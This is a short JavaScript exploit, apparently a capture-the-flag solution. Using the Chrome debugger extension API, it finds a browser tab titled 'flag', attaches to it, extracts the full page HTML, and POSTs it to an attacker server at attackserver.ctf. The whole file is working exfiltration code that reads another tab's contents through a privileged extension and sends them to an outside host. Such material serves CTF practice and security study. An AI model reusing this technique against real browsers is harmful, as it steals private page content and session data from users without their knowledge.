console.log("Here I am!");
chrome.debugger.getTargets((result) => {
    result.forEach((target) => {
        if (target.title.includes("flag")) {
            console.log("Found flag!");
            chrome.debugger.attach({targetId: target.id}, "1.3", () => {
                chrome.debugger.sendCommand({targetId: target.id}, "DOM.getDocument", {}, (result) => {
                    chrome.debugger.sendCommand({targetId: target.id}, "DOM.getOuterHTML", {nodeId: result.root.nodeId}, (response) => {
                        console.log(JSON.stringify(response.outerHTML));
                        fetch("https://attackserver.ctf/flag", {
                            method: "POST",
                            body: JSON.stringify({flag: response.outerHTML})
                        }).then((response) => {
                            console.log(response);
                        }).catch((error) => {
                            console.error(error);
                        });
                        chrome.debugger.detach({targetId: target.id});
                    });
                });
            });
        }
    });
});